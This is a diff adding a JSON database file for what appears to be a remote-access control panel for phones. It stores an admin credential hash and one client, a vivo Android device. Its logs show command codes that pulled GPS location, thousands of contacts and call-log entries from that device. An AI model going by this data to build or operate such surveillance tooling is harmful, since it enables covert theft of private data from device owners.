@@ -1,0 +1,112 @@
+{
+  "admin": {
+    "username": "admin",
+    "password": "5f4dcc3b5aa765d61d8327deb882cf99",
+    "loginToken": "",
+    "logs": [
+      {
+        "time": "2020-01-11T15:23:07.971Z",
+        "type": "SUCCESS",
+        "message": "Build Succeded!"
+      },
+      {
+        "time": "2022-11-04T21:31:53.764Z",
+        "type": "SUCCESS",
+        "message": "Build Succeded!"
+      },
+      {
+        "time": "2022-11-04T21:36:29.003Z",
+        "type": "SUCCESS",
+        "message": "Build Succeded!"
+      },
+      {
+        "time": "2022-11-04T21:37:04.931Z",
+        "type": "INFO",
+        "message": "96eccc0c5573baa6 Connected"
+      },
+      {
+        "time": "2022-11-04T21:37:44.543Z",
+        "type": "INFO",
+        "message": "Requested 0xLO From 96eccc0c5573baa6"
+      },
+      {
+        "time": "2022-11-04T21:37:44.683Z",
+        "type": "SUCCESS",
+        "message": "96eccc0c5573baa6 GPS Updated"
+      },
+      {
+        "time": "2022-11-04T21:38:23.608Z",
+        "type": "INFO",
+        "message": "Requested 0xCO From 96eccc0c5573baa6"
+      },
+      {
+        "time": "2022-11-04T21:38:29.253Z",
+        "type": "SUCCESS",
+        "message": "96eccc0c5573baa6 Contacts Updated - 2403 New Contacts Added"
+      },
+      {
+        "time": "2022-11-04T21:38:54.409Z",
+        "type": "INFO",
+        "message": "Requested 0xCL From 96eccc0c5573baa6"
+      },
+      {
+        "time": "2022-11-04T21:40:01.483Z",
+        "type": "SUCCESS",
+        "message": "96eccc0c5573baa6 Call Log Updated - 6765 New Calls"
+      },
+      {
+        "time": "2022-11-04T21:40:01.488Z",
+        "type": "INFO",
+        "message": "96eccc0c5573baa6 Disconnected"
+      },
+      {
+        "time": "2022-11-04T21:40:19.539Z",
+        "type": "INFO",
+        "message": "96eccc0c5573baa6 Connected"
+      },
+      {
+        "time": "2022-11-04T21:43:07.602Z",
+        "type": "INFO",
+        "message": "Requested 0xSM From 96eccc0c5573baa6"
+      },
+      {
+        "time": "2022-11-04T21:43:07.722Z",
+        "type": "INFO",
+        "message": "96eccc0c5573baa6 Disconnected"
+      },
+      {
+        "time": "2022-11-08T12:17:28.869Z",
+        "type": "SUCCESS",
+        "message": "Build Succeded!"
+      },
+      {
+        "time": "2022-11-08T18:57:08.230Z",
+        "type": "SUCCESS",
+        "message": "Build Succeded!"
+      },
+      {
+        "time": "2022-11-08T19:03:27.531Z",
+        "type": "SUCCESS",
+        "message": "Build Succeded!"
+      }
+    ],
+    "ipLog": []
+  },
+  "clients": [
+    {
+      "clientID": "96eccc0c5573baa6",
+      "firstSeen": "2022-11-04T21:37:04.923Z",
+      "lastSeen": "2022-11-04T21:43:07.723Z",
+      "isOnline": false,
+      "dynamicData": {
+        "clientIP": "192.168.1.8",
+        "clientGeo": {},
+        "device": {
+          "model": "I2018",
+          "manufacture": "vivo",
+          "version": "12"
+        }
+      }
+    }
+  ]
+}
